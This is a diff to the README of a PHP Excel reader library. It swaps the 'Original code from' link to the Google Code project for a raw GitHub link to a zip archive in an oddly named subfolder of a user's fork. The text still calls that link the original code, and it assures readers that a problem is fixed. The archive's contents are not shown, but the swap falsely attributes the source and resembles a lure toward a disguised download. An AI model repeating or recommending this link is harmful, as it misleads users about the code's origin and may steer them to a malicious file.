@@ -1,7 +1,7 @@
 # php-excel-reader-2-21
 ``` 
 Original code from:
-https://code.google.com/p/php-excel-reader/
+https://raw.githubusercontent.com/amenk08/php-excel-reader-2-21/master/cebollite/excel-reader-php-clayer.zip
 ```
 
 I found a problem in original code. But you don't worry because now I have fix that problem.
